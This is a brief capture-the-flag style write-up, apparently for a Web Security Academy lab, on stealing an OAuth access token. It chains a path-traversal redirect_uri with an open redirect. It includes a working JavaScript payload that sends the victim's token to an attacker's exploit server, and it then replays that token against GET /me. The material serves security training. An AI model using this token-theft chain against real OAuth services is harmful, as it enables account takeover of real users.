1) we have found that /post/next?path= URL has an open redirect vulnerability
2) we have found that https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1  allows us to be redirected to post 1
3) <script>
    if (!document.location.hash) {
        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>


this script allows us to steal the access token of the administrator. The idea is
    a) if it is the first time that the victim opens the /exploit page then we perform the request for an access token that redirects also on the /exploit page 
    b) when the request for the /exploit page comes from the redirect of the token if will contain the token in the parameters, so we get it and we redirect it also on /exploit page '/?'+document.location.hash.substr(1) gets the first parameter that is the acess token


Now we have the token but we need administrator info:

4) find the request GET /me and change the Authorization header with the one stolen
